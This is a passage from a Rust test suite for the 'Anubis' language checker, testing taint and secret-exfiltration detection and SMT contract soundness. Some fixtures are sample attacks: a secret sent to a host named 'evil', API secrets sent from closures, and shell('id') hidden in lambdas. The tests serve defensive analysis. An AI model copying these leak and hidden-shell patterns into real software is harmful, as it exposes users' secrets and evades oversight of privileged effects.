            .expect_err("secret array-element write then egress must be flagged");
        // (precision — set-only) a CLEAN value into a container element still accepts (no over-taint).
        tc_ok(r#"fn main() { let buf = ["ok","ok"]; buf[0] = "still ok"; sink(buf[0]); }"#)
            .expect("a clean element write must not over-taint the container");
    }

    #[test]
    fn impl_method_argument_does_not_launder_taint_or_secret() {
        // A method call `recv.m(arg)` parses as `Expr::CallExpr` (callee is a FieldAccess), so the
        // interprocedural sink/egress checks — which lived only in the bare `Expr::Call` arm — never ran
        // on method arguments: `m.deliver(secret)` / `r.run(input())` laundered through a method that
        // sends. `compute_method_param_{sinks,egress}` now summarize impl methods (self at index 0), and
        // the CallExpr arm consults them with the self-offset (summary index p≥1 ↔ call arg p-1).
        // (confidentiality) secret into a method that egresses it → INTERPROC_EXFILTRATION.
        let sec = tc_ok(
            r#"struct Mailer { host: u32 }
impl Mailer { fn deliver(self, msg) uses(net.send) { send("h", 80, msg); } }
fn main() uses(net.send) { let m = Mailer { host: 1 }; m.deliver(secret_source("k")); }"#,
        )
        .expect_err("secret into an egressing method must be flagged");
        assert!(
            sec.contains("ANUBIS_INTERPROC_EXFILTRATION"),
            "got: {sec}"
        );
        // (integrity) tainted input into a method that sinks it → INTERPROC_SINK.
        let taint = tc_ok(
            r#"struct Runner { id: u32 }
impl Runner { fn run(self, cmd) uses(net.send) { send("h", 80, cmd); } }
fn main() uses(net.send) { let r = Runner { id: 1 }; r.run(input()); }"#,
        )
        .expect_err("tainted input into a sinking method must be flagged");
        assert!(taint.contains("ANUBIS_INTERPROC_SINK"), "got: {taint}");
        // (precision) a CLEAN argument to the same egressing method still accepts (no false positive).
        tc_ok(
            r#"struct Mailer { host: u32 }
impl Mailer { fn deliver(self, msg) uses(net.send) { send("h", 80, msg); } }
fn main() uses(net.send) { let m = Mailer { host: 1 }; m.deliver("public"); }"#,
        )
        .expect("a clean argument to an egressing method must not be flagged");
        // (precision) a secret into a method that neither sinks nor egresses it still accepts.
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn store(self, x) { let held = x; } }
fn main() { let v = Vault { id: 1 }; v.store(secret_source("k")); }"#,
        )
        .expect("a secret merely bound inside a non-leaking method must not be flagged");
    }

    #[test]
    fn interproc_transitivity_through_method_calls_is_caught() {
        // #68: a param laundered THROUGH a method that sinks/egresses it. The joint free-fn↔method
        // param_sinks/param_egress fixpoint + the CallExpr arms on collect_param_sinks_in_expr /
        // expr_param_flow close free-fn→method, method→method, and value-through-method-return shapes.
        // free-fn→method SINK.
        let s1 = tc_ok(
            r#"struct Runner { id: u32 }
impl Runner { fn run(self, cmd) uses(net.send) { send("h", 80, cmd); } }
fn fwd(r, cmd) { r.run(cmd); }
fn main() uses(net.send) { let r = Runner { id: 1 }; fwd(r, input()); }"#,
        )
        .expect_err("free-fn forwarding a tainted param into a sinking method must be flagged");
        assert!(s1.contains("ANUBIS_INTERPROC_SINK"), "got: {s1}");
        // method→method EGRESS (needs the JOINT fixpoint — ship's summary depends on deliver's METHOD summary).
        let s2 = tc_ok(
            r#"struct Mailer { host: u32 }
impl Mailer { fn deliver(self, msg) uses(net.send) { send("evil", 80, msg); } fn ship(self, p) { self.deliver(p); } }
fn main() uses(net.send) { let m = Mailer { host: 1 }; m.ship(secret_source("k")); }"#,
        )
        .expect_err("method forwarding a secret into an egressing method must be flagged");
        assert!(s2.contains("ANUBIS_INTERPROC_EXFILTRATION"), "got: {s2}");
        // value-carry through a method RETURN into a sink (the expr_param_flow CallExpr arm).
        let s3 = tc_ok(
            r#"struct Wrapper { id: u32 }
impl Wrapper { fn wrap(self, v) { return v; } }
fn leak(w, x) uses(net.send) { send("h", 80, w.wrap(x)); }
fn main() uses(net.send) { let w = Wrapper { id: 1 }; leak(w, input()); }"#,
        )
        .expect_err("a tainted param carried through a method return into a sink must be flagged");
        assert!(s3.contains("ANUBIS_INTERPROC_SINK"), "got: {s3}");
        // (precision) a method that DISCARDS its arg is not summarized → forwarding accepts.
        tc_ok(
            r#"struct Store { id: u32 }
impl Store { fn ignore(self, x) { return 5; } }
fn drop_it(m, x) { m.ignore(x); }
fn main() uses(net.send) { let m = Store { id: 1 }; drop_it(m, secret_source("k")); }"#,
        )
        .expect("a method that discards its arg must not summarize the forwarder as leaking");
    }

    #[test]
    fn higher_order_closure_args_recognizer_covers_the_closure_applying_builtins() {
        use crate::middle::effects::higher_order_closure_args as h;
        // list/map HOFs + times/sort_by/… apply the closure at index 1.
        for b in [
            "map", "filter", "each", "find", "any", "all", "count", "sort_by", "flat_map",
            "take_while", "drop_while", "position", "min_by", "max_by", "partition", "map_values",
            "reduce", "times",
        ] {
            assert_eq!(h(b), &[1usize], "{b} should apply its closure at index 1");
        }
        assert_eq!(h("apply"), &[0usize]);
        assert_eq!(h("call"), &[0usize]);
        assert_eq!(h("compose"), &[0usize, 1usize]);
        // a non-HO builtin / user name recognizes nothing (no over-descent).
        assert!(h("print").is_empty());
        assert!(h("len").is_empty());
        assert!(h("some_user_fn").is_empty());
    }

    #[test]
    fn closure_hidden_egress_is_caught_at_higher_order_builtins() {
        // #65: a sink/egress/privileged call inside a lambda APPLIED by a higher-order builtin
        // (each/map/times/apply/…) is now charged — it was invisible before (defeating the trifecta +
        // the Safe net.send gate).
        // (capability) a shell hidden in each's lambda without uses(shell).
        let sh = tc_ok(r#"fn agent() { each([1], |x| shell("id")); }"#)
            .expect_err("a shell in a HO-applied lambda without uses(shell) must be forbidden");
        assert!(sh.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE"), "got: {sh}");
        // (blocker: times) a shell hidden in times' lambda.
        tc_ok(r#"fn agent() { times(3, |i| shell("id")); }"#)
            .expect_err("times is a closure-applying builtin — a shell in its lambda must be forbidden");
        // (confidentiality) a captured secret sent inside a HO-applied lambda (cap declared → only exfil).
        let sec = tc_ok(
            r#"fn agent() uses(net.send) { let k = secret_source("api"); each([1], |x| send("h", 80, k)); }"#,
        )
        .expect_err("a captured secret egressed inside a HO-applied lambda must be flagged");
        assert!(sec.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {sec}");
        // (apply, index 0) a shell in apply's index-0 closure.
        tc_ok(r#"fn agent() { apply(|x| shell("id"), [1]); }"#)
            .expect_err("apply applies its closure at index 0 — a shell there must be forbidden");
        // (precision) a pure lambda charges nothing → accepts.
        tc_ok(r#"fn f() { let s = map([1,2,3], |x| x + 1); let t = filter(s, |y| y > 0); }"#)
            .expect("a pure HO-applied lambda must not be flagged");
        // (precision) a defined-but-uncalled closure literal is opaque → accepts.
        tc_ok(r#"fn f() { let g = |x| send("a", 80, x); print(1); }"#)
            .expect("a closure literal that is never applied must not be flagged");
        // (precision) the capability declared → accepts.
        tc_ok(r#"fn f() uses(net.send) { each([1], |x| send("h", 80, x)); }"#)
            .expect("a HO-applied lambda whose effect is declared must be accepted");
        // (precision) a well-formed declassify in the lambda releases the captured secret.
        tc_ok(
            r#"fn agent() uses(net.send) { let k = secret_source("api"); each([1], |x| send("h", 80, declassify(k, "p", "r"))); }"#,
        )
        .expect("a declassified captured secret in a HO-applied lambda releases");
    }

    #[test]
    fn phase3_qf_s_var_var_string_equality() {
        // Phase-3 QF_S: a VAR-vs-VAR string equality (no literal anchor) now discharges/disproves in QF_S
        // too — closing the spurious rejection of a true identity contract. Sound: runtime String==String
        // and SMT `(= a b)` are BOTH exact structural equality. Theory selection can no longer key on a
        // `"` in the body (a var-var obligation has none), so the obligation carries an explicit `strings`
        // sort tag that forces QF_S + String declarations.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            };
        // A TRUE identity ensures discharges: result substitutes to the returned `s`, so `s == s`.
        assert!(
            discharged(r#"fn f(s: string) -> string ensures(result == s) { return s; }"#),
            "var-var identity ensures(result == s) for `return s` must discharge"
        );
        // A var-var ensures proven THROUGH a var-var requires: assume `s == t`, prove `result(=s) == t`.
        assert!(
            discharged(r#"fn f(s: string, t: string) -> string requires(s == t) ensures(result == t) { return s; }"#),
            "requires(s==t) ⇒ ensures(result==t) for `return s` must discharge"
        );
        // `!=` var-var: assume `s != t`, prove `result(=s) != t`.
        assert!(
            discharged(r#"fn f(s: string, t: string) -> string requires(s != t) ensures(result != t) { return s; }"#),
            "requires(s!=t) ⇒ ensures(result!=t) must discharge"
        );
        // A var-var ensures with NO relating requires is DISPROVED (s and t unrelated → can't prove s==t).
        assert!(
            !discharged(r#"fn f(s: string, t: string) -> string ensures(result == t) { return s; }"#),
            "an unconstrained var-var ensures(result==t) must be disproved, not spuriously discharged"
        );
    }

    #[test]
    fn call_site_requires_discharged_across_all_lanes_and_positions() {
        // SOUNDNESS (hunt-confirmed false accepts): a callee's `requires` is ASSUMED inside its body
        // (seeding its `assert`/`ensures` discharge), so the CALLER must be forced to prove it at the
        // call site — else a violating call certifies a runtime-trapping assert / a false ensures.
        // Before this slice only INT preconditions at a Let-initializer call site emitted a `requires@`
        // obligation; string/float preconditions, and calls in STATEMENT/Assign position, emitted none.
        let accepts = |src: &str| {
            match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            }
        };
        // ── caller CANNOT prove the precondition ⇒ MUST reject ─────────────────────────────────────
        // string literal arg violates a literal requires
        assert!(
            !accepts(r#"fn g(s: string) -> string requires(s == "a") { return s; } fn main() { let r = g("b"); print(r); }"#),
            "string requires violated by a literal arg must reject at the call site"
        );
        // var-var string requires (the case this session's var-var slice widened): unprovable ⇒ reject
        assert!(
            !accepts(r#"fn h(s: string, t: string) -> string requires(s == t) ensures(result == t) { return s; } fn main() { let o = h("alpha", "beta"); print(o); }"#),
            "var-var string requires the caller cannot prove must reject at the call site"
        );
        // float requires violated
        assert!(
            !accepts(r#"fn f(x: f64) -> f64 requires(x == 1.0) { return x; } fn main() { let r = f(2.0); print(r); }"#),
            "float requires violated by a literal arg must reject at the call site"
        );
        // int requires in STATEMENT position (bare ExprStmt call — no Let binding)
        assert!(
            !accepts(r#"fn g(x: u32) requires(x > 0) { } fn main() { g(0); }"#),
            "int requires in statement position must reject (statement-position call was unchecked)"
        );
        // int requires in ASSIGN-value position
        assert!(
            !accepts(r#"fn g(x: u32) -> u32 requires(x > 0) { return x; } fn main() { let mut y = 5; y = g(0); print(y); }"#),
            "int requires in assign-value position must reject"
        );
        // ── caller CAN prove the precondition ⇒ MUST still accept (no over-rejection) ───────────────
        // satisfying literal
        assert!(
            accepts(r#"fn g(s: string) -> string requires(s == "a") { return s; } fn main() { let r = g("a"); print(r); }"#),
            "a string requires satisfied by a matching literal must still be accepted"
        );
        // caller establishes the precondition via its own requires (var-var chained)
        assert!(
            accepts(r#"fn h(s: string, t: string) -> string requires(s == t) ensures(result == t) { return s; } fn caller(a: string, b: string) -> string requires(a == b) { return h(a, b); } fn main() { print(caller("x", "x")); }"#),
            "a caller that establishes the var-var precondition via its own requires must be accepted"
        );
        // satisfying float + int
        assert!(
            accepts(r#"fn f(x: f64) -> f64 requires(x == 1.0) { return x; } fn main() { let r = f(1.0); print(r); }"#),
            "a float requires satisfied by a matching literal must be accepted"
        );
        assert!(
            accepts(r#"fn g(x: u32) requires(x > 0) { } fn main() { g(5); }"#),
            "an int requires satisfied in statement position must be accepted"
        );
        // ── CLOSED (constant-arg) preconditions discharge at ANY depth, incl. inside a branch. A
        //    predicate with no free variable (`(0-5) > 0`, `"b" == "a"`, `2.0 == 1.0`) is decided
        //    ABSOLUTELY by the solver — its verdict does not depend on the branch path condition — so
        //    discharging it inside an `if` catches a definitely-violating call with ZERO over-rejection
        //    risk. These were fail-open (gated off) before this slice.
        assert!(
            !accepts(r#"fn g(x: i64) requires(x > 0) { assert(x > 0); } fn caller(b: bool) { if b { g(0 - 5); } } fn main() { caller(true); }"#),
            "a CLOSED int violating call in a branch must reject (constant obligation, context-free)"
        );
        assert!(
            !accepts(r#"fn g(s: string) requires(s == "a") { assert(s == "a"); } fn caller(b: bool) { if b { g("b"); } } fn main() { caller(true); }"#),
            "a CLOSED string violating call in a branch must reject"
        );
        assert!(
            !accepts(r#"fn g(x: f64) -> f64 requires(x == 1.0) { assert(x == 1.0); return x; } fn caller(b: bool) { if b { let y = g(2.0); print(y); } } fn main() { caller(true); }"#),
            "a CLOSED float violating call in a branch must reject"
        );
        // ── NO over-rejection: a VARIABLE-arg branch call whose precondition depends on the (out-of-scope)
        //    branch guard stays GATED (only closed preconditions discharge in a branch). A satisfying
        //    closed call in a branch is discharged and accepted; a variable-arg guarded call is deferred.
        assert!(
            accepts(r#"fn g(s: string) requires(s == "a") { } fn caller(x: string) { if x == "a" { g(x); } } fn main() { caller("a"); }"#),
            "a branch-guarded VARIABLE-arg string call stays gated (deferred), not over-rejected"
        );
        assert!(
            accepts(r#"fn g(x: u32) requires(x > 0) { } fn caller(b: bool) { if b { g(5); } } fn main() { caller(true); }"#),
            "a CLOSED satisfying int call in a branch is discharged and accepted"
        );
        assert!(
            accepts(r#"fn g(x: i64) requires(x > 0) { } fn caller(a: i64) requires(a > -100) { if a > 0 { g(a); } } fn main() { caller(5); }"#),
            "a branch-guarded VARIABLE-arg int call stays gated (guard out of scope) — no over-rejection"
        );
    }

    #[test]
    fn branch_guard_is_a_scoped_path_condition() {
        // A branch guard is a TRUE fact inside the branch, so it is pushed as a scoped assumption. This
        // closes the int-Let-init branch OVER-REJECTION (an int Let-init call discharges at all depths,
        // so `if a > 0 { let y = g(a); }` was rejected because the guard `a > 0`, which proves g's
        // `requires(x > 0)`, was not in scope). The guard is EXEMPT from the vacuity check: a provably-DEAD
        // branch (`requires(x>0) { if x<0 { … } }` — guard contradicts the precondition) is legitimately
        // unreachable and must pass, NOT trip the "contradictory assumptions" vacuity FAIL.
        let accepts = |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
            Err(_) => false,
        };
        // Guard PROVES the callee precondition ⇒ no more over-rejection at the int Let-init position.
        assert!(
            accepts(r#"fn g(x: i64) -> i64 requires(x > 0) { return x; } fn c(a: i64) requires(a > 0 - 100) { if a > 0 { let y = g(a); print(y); } } fn main() { c(5); }"#),
            "a guard that proves the callee requires must NOT over-reject an int Let-init branch call"
        );
        // A guard weaker than the requires still rejects (sound, not a blanket accept).
        assert!(
            !accepts(r#"fn g(x: i64) -> i64 requires(x > 10) { return x; } fn c(a: i64) requires(a > 0 - 100) { if a > 5 { let y = g(a); print(y); } } fn main() { c(20); }"#),
            "a guard (a>5) weaker than the requires (x>10) must still reject the int Let-init branch call"
        );
        // The else branch gets the NEGATED guard.
        assert!(
            !accepts(r#"fn g(x: i64) -> i64 requires(x > 0) { return x; } fn c(a: i64) requires(a > 0 - 100) { if a < 0 - 200 { let z = 0; print(z); } else { let y = g(a); print(y); } } fn main() { c(5); }"#),
            "the else branch's negated guard must not spuriously prove the callee requires"
        );
        // REGRESSION GUARD (the review's blocker): a DEAD branch whose guard contradicts the precondition
        // is unreachable — its assert must PASS vacuously, NOT be flipped to a vacuity FAIL by the pushed
        // guard making {requires ∧ guard} unsatisfiable.
        assert!(
            accepts(r#"fn f(x: i64) requires(x > 0) { if x < 0 { assert(x == x); } } fn main() { f(5); }"#),
            "a dead branch (guard contradicts the precondition) must pass vacuously, not fail the vacuity check"
        );
        // A guard var reassigned in the branch drops the stale guard fact (no false accept).
        assert!(
            !accepts(r#"fn g(x: i64) -> i64 requires(x > 0) { return x; } fn c(a: i64) requires(a > 0 - 100) { if a > 0 { a = 0 - 5; let y = g(a); print(y); } } fn main() { c(5); }"#),
            "a guard variable reassigned in the branch must drop the stale guard (reject, no false accept)"
        );
        // The vacuity exclusion is by MULTISET, not value: a genuine `requires`/`assume` contradiction must
        // STILL fire even when a premise shares an SMT string with an in-scope guard (`if x>0` == `x>0`).
        assert!(
            !accepts(r#"fn f(x: i64) -> i64 requires(x > 0) requires(x < 0) ensures(result > 999) { if x > 0 { return x; } return x; } fn main() { print(f(5)); }"#),
            "contradictory requires must still fire vacuous even when a guard equals one requires' SMT string"
        );
        assert!(
            !accepts(r#"fn f(x: i64) requires(x > 0) { if x > 0 { assume(x < 0); assert(x > 999); } } fn main() { f(5); }"#),
            "an assume/requires contradiction inside a guarded (live) branch must still fire vacuous"
        );
    }

    #[test]
    fn phase3_qf_s_string_equality_contracts_discharge_or_disprove() {
        // Phase-3 QF_S: a string-equality `ensures`/`requires`/`assert` over a `string` param is now
        // discharged in Z3 QF_S (was ANUBIS_STRING_CONTRACT_UNMODELED). Sound both ways — runtime string
        // `==` and SMT `(= a b)` are both exact structural equality (no NaN-like edge case).
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // TRUE string postcondition discharges (result substitutes to the returned param).
        assert!(
            discharged(
                r#"fn label(s: string) -> string requires(s == "open") ensures(result == "open") { return s; }"#
            ),
            "requires(s==\"open\") ⇒ ensures(result==\"open\") must discharge"
        );
        // TRUE string assert discharges under the precondition.
        assert!(
            discharged(r#"fn check(s: string) requires(s == "open") { assert(s == "open"); }"#),
            "assert(s==\"open\") under requires(s==\"open\") must discharge"
        );
        // FALSE string postcondition is DISPROVED (not modeled-away): result==s=="open" contradicts "closed".
        assert!(
            !discharged(
                r#"fn label(s: string) -> string requires(s == "open") ensures(result == "closed") { return s; }"#
            ),
            "a false string ensures must be disproved, not silently accepted"
        );
        // FALSE string assert is disproved.
        assert!(
            !discharged(r#"fn check(s: string) requires(s == "open") { assert(s == "closed"); }"#),
            "a false string assert must be disproved"
        );
        // Without the precondition, the postcondition is NOT valid (s unconstrained) → not discharged.
        assert!(
            !discharged(r#"fn label(s: string) -> string ensures(result == "open") { return s; }"#),
            "an unconstrained string ensures must not be spuriously discharged"
        );
        // SOLVER FALSE-ACCEPT GUARD (backslash escaping). Anubis's lexer decodes the source `\\u{41}` to
        // the 6-char runtime string `\u{41}`, which is NOT equal to the 1-char `A`. z3's Unicode-strings
        // theory decodes `\u{XXXX}` inside a literal, so an encoder that did not escape the backslash would
        // emit `"\u{41}"`, z3 would re-decode it to `A`, and the false `ensures(result == "A")` would be
        // spuriously PROVED. The fix (every `\` → `\u{5c}`) keeps the two runtime-distinct literals distinct
        // in QF_S, so this must be DISPROVED (not discharged).
        assert!(
            !discharged(
                r#"fn label(s: string) -> string requires(s == "\\u{41}") ensures(result == "A") { return s; }"#
            ),
            "a backslash-u literal must not be re-decoded by z3 into a false-accept"
        );
    }

    #[test]
    fn qfs_binding_shadow_and_control_char_false_accepts_closed() {
        // Three QF_S solver FALSE-ACCEPTS an adversarial hunt found (2026-07-16), each a binding form that
        // shadows a name without dropping the prior binding's solver fact, OR a control-char literal z3
        // mishandles. All were confirmed live on HEAD (real PASS obligations proving runtime-false asserts)
        // and are closed here. A false-accept is the worst failure for a proof-carrying language.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            };
        // The precise false-accept for an ASSERT is a solver PASS obligation that PROVES it (an unmodeled
        // assert produces `solver:no-obligations` and defers to runtime — sound). So: is a real assert
        // obligation discharged?
        let proves_an_assert = |src: &str| -> bool {
            match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .any(|c| c.status == "PASS" && c.name.starts_with("assert:")),
                Err(_) => false,
            }
        };

        // C1 — LetPattern (`let [s] = [..]`) shadows a modeled string binding without clearing its fact.
        // The ensures is a CONTRACT → must be REJECTED (not discharged against the stale fact).
        assert!(
            !discharged(r#"fn f() -> string ensures(result == "A") { let s = "A"; let [s] = ["B"]; return s; }"#),
            "C1a: a LetPattern shadow of a string let must not discharge a stale-fact ensures"
        );
        assert!(
            !discharged(r#"fn f(s: string) -> string requires(s == "A") ensures(result == "A") { let [s] = ["B"]; return s; }"#),
            "C1b: a LetPattern shadow of a string param must not discharge a stale-fact ensures"
        );

        // C2 — a `for` loop VARIABLE shadows a modeled string binding; a body assert over it must NOT be
        // solver-proved (it becomes unmodeled → runtime-enforced).
        assert!(
            !proves_an_assert(r#"fn f() { let s = "a"; for s in ["b", "c"] { assert(s == "a"); } }"#),
            "C2a: a for-var shadowing a string let must not let the body assert be proved"
        );
        assert!(
            !proves_an_assert(r#"fn f(s: string) requires(s == "a") { for s in ["b", "c"] { assert(s == "a"); } }"#),
            "C2b: a for-var shadowing a string param must not let the body assert be proved"
        );

        // C2' — a `while let` pattern binder shadows a modeled string binding; its analyze_stmts'd body
        // assert must NOT be proved either (same fix as `for`).
        assert!(
            !proves_an_assert(r#"fn f() { let s = "a"; while let Some(s) = Some("b") { assert(s == "a"); } }"#),
            "C2': a while-let binder shadowing a string let must not let the body assert be proved"
        );
        // if-let / match-arm branch bodies are expressions (NOT solver-analyzed for asserts), so a
        // shadowed assert there is never PROVEN (defers to runtime). Lock that in against a future change
        // that would analyze those branches without a shadow-clear.
        assert!(
            !proves_an_assert(r#"fn f() { let s = "a"; if let Some(s) = Some("b") { assert(s == "a"); } }"#),
            "if-let branch assert over a shadowed binder must not be proved"
        );
        assert!(
            !proves_an_assert(r#"fn f() { let s = "a"; match Some("b") { Some(s) => { assert(s == "a"); } _ => {} } }"#),
            "match-arm assert over a shadowed binder must not be proved"
        );

        // C3 — a control character (NUL) in a string literal: z3 truncates "A\0B" to "A", so the false
        // assert was PROVED. The literal is now non-modelable → the assert is unmodeled (deferred).
        assert!(
            !proves_an_assert("fn f(s: string) requires(s == \"A\") { assert(s == \"A\\u{0}B\"); }"),
            "C3: a NUL/control-char literal must not be modeled (z3 truncates it into a false proof)"
        );

        // ── Positive controls: the fixes must NOT spuriously reject valid programs. ──
        // A `for` over a DIFFERENT variable leaves the contracted binding's fact intact → still discharges.
        assert!(
            discharged(r#"fn f() -> string ensures(result == "a") { let s = "a"; for x in ["b"] { } return s; }"#),
            "a for-loop over a different var must not invalidate the outer string let"
        );
        // COMPLETENESS (review-caught over-reject): a for/while-let loop var shadow is BODY-SCOPED, so the
        // outer binding is restored after the loop and a post-loop contract over it MUST still discharge —
        // for the binding itself AND a transitive dependent, in both the string and integer lanes.
        assert!(
            discharged(r#"fn f() -> string ensures(result == "a") { let s = "a"; for s in ["b"] { } return s; }"#),
            "a for-var shadowing a string binding must be RESTORED after the loop (post-loop ensures holds)"
        );
        assert!(
            discharged(r#"fn f() -> u32 ensures(result == 5) { let n = 5; let y = n; for n in [1, 2, 3] { } return y; }"#),
            "a transitive dependent of a for-shadowed int binding must keep its constraint after the loop"
        );
        assert!(
            discharged(r#"fn f() -> u32 ensures(result == 7) { let n = 7; for n in [1, 2, 3] { } return n; }"#),
            "an int for-var shadow must be restored after the loop"
        );
        // A genuinely-TRUE printable-ASCII assert is still solver-proved (the modelable domain is unchanged).
        assert!(
            proves_an_assert(r#"fn f(s: string) requires(s == "a") { assert(s == "a"); }"#),
            "a true printable-ASCII string assert must still be proved"
        );
    }

    #[test]
    fn phase3_qf_s_string_let_chaining() {
        // Phase-3 QF_S: a genuinely-string, NEVER-REASSIGNED `let` becomes a String defining fact in
        // the shared sort-partitioned assumptions channel (the exact mirror of the float-let slice
        // 06eb6c1), so string contracts chain through local bindings.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // A string-literal let flows into the postcondition via result→return-expr substitution.
        assert!(
            discharged(r#"fn f() -> string ensures(result == "ok") { let s = "ok"; return s; }"#),
            "a string-literal let must chain into a true ensures"
        );
        // Depth-2 alias chain: t = s = "ok".
        assert!(
            discharged(
                r#"fn f() -> string ensures(result == "ok") { let s = "ok"; let t = s; return t; }"#
            ),
            "a depth-2 string let alias chain must discharge"
        );
        // Chain from a contracted param through a let into a body assert.
        assert!(
            discharged(r#"fn f(s: string) requires(s == "go") { let t = s; assert(t == "go"); }"#),
            "a param-aliasing let must carry the requires fact into an assert"
        );
        // A FALSE let-backed ensures is DISPROVED (not modeled away).
        assert!(
            !discharged(r#"fn f() -> string ensures(result == "bad") { let s = "ok"; return s; }"#),
            "a false string-let ensures must be disproved"
        );
        // Backslash guard THROUGH THE LET FACT: the 6-char runtime string `\u{41}` (source `"\\u{41}"`)
        // must not be re-decoded by z3 into the 1-char "A" — the let-fact encoder must reuse the
        // escaped string_expr_to_smt, not a hand-rolled quote-only encoding.
        assert!(
            !discharged(
                r#"fn f() -> string ensures(result == "A") { let s = "\\u{41}"; return s; }"#
            ),
            "a backslash-u literal must not false-accept through a let fact"
        );
        // A REASSIGNED string let stays unmodeled — fail-closed, same reassigned_roots gate as floats.
        assert!(
            !discharged(
                r#"fn f() -> string ensures(result == "b") { let s = "a"; s = "b"; return s; }"#
            ),
            "a reassigned string let must stay unmodeled (fail-closed)"
        );
        // EMBEDDED reassignment (write inside an if-expression/branch) — the exact soundness vector the
        // float lane's reassigned_roots gate closes (21f441a): `collect_assigned_roots` captures the
        // embedded write BEFORE analyze_stmts, so `s` is never modeled and the FALSE (when c) ensures
        // cannot be proved. Runtime: c ⇒ s="b" so `result == "a"` is violable → must NOT discharge.
        assert!(
            !discharged(
                r#"fn f(c: bool) -> string ensures(result == "a") { let s = "a"; if c { s = "b"; } return s; }"#
            ),
            "a string let reassigned in a branch must stay unmodeled (reassigned_roots gate)"
        );
        // SHADOW: a same-name re-let must not let the OLD binding's fact prove a contract over the NEW
        // one. `let s = "a"; let s = "b"` → the second `s` shadows; the postcondition is about the new s.
        assert!(
            discharged(
                r#"fn f() -> string ensures(result == "b") { let s = "a"; let s = "b"; return s; }"#
            ),
            "a re-let (shadow) must model the NEW binding's value"
        );
        // CROSS-SORT SHADOW (guards `solver_string_vars.remove` on re-let): a string let shadowed by an
        // INT let of the same name must clear the string membership — otherwise `fact_is_string` would
        // misclassify the new binding's int def-fact `(= anb_s (_ bv3 64))` as a string fact and DROP it
        // from the QF_BV obligation, leaving `anb_s` free → a spurious FALSE REJECT of `assert(s == 3)`.
        assert!(
            discharged(r#"fn f() { let s = "a"; let s = 3; assert(s == 3); }"#),
            "a string→int re-let must clear string membership so the int fact is not sort-dropped"
        );
        // String concat (`+` is runtime concat) is a DEFERRED residual — must stay unmodeled, and in
        // particular must never inject a bit-vector fact over String-sorted symbols (the
        // symbolic_widths eviction guards this).
        assert!(
            !discharged(
                r#"fn f() -> string ensures(result == "aa") { let s = "a"; let u = s + s; return u; }"#
            ),
            "string concat must stay unmodeled (deferred residual)"
        );
    }

    #[test]
    fn impl_method_return_secret_or_taint_is_caught_at_egress() {
        // #67: an impl method whose RETURN carries an internally-minted secret/taint (the getter/
        // accessor exfil `let k = v.key(); send(k)` / `send(v.key())`) launders past even the DIRECT
        // egress/sink check unless the method-return summary labels the value. `compute_method_secret_fns`/
        // `compute_method_tainting_fns` mark such methods; the `Expr::CallExpr` arm of the method-aware
        // walkers fires on `v.key()` — for the bind, nested, AND value-block-local forms.
        // (confidentiality) bind form → SECRET_EXFILTRATION.
        let sec_bind = tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; let k = v.key(); send("h", 80, k); }"#,
        )
        .expect_err("a secret method return, bound then egressed, must be flagged");
        assert!(
            sec_bind.contains("ANUBIS_SECRET_EXFILTRATION"),
            "got: {sec_bind}"
        );
        // (confidentiality) nested form → SECRET_EXFILTRATION.
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; send("h", 80, v.key()); }"#,
        )
        .expect_err("a secret method return, egressed directly, must be flagged");
        // (confidentiality) value-block-local form (the design-review blocker) → SECRET_EXFILTRATION.
        // `Expr::Block` only occurs as an if/match/lambda body (no standalone `{…}` value expression),
        // so the block-local binding lives in an if-branch; this exercises the walk_block_secret threading.
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; let k = if true { let inner = v.key(); inner } else { 0 }; send("h", 80, k); }"#,
        )
        .expect_err("a secret method return laundered through a value block must be flagged");
        // (integrity) tainted method return → TAINTED_SINK.
        let taint = tc_ok(
            r#"struct Reader { id: u32 }
impl Reader { fn tag(self) { return input(); } }
fn main() { let r = Reader { id: 1 }; sink(r.tag()); }"#,
        )
        .expect_err("a tainted method return, sunk, must be flagged");
        assert!(
            taint.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {taint}"
        );
        // (precision) a declassified secret method return releases → accepts.
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; send("h", 80, declassify(v.key(), "p", "r")); }"#,
        )
        .expect("a well-formed declassify of a secret method return releases it");
        // (precision) a method that returns no secret is not flagged.
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn label(self) { return 7; } }
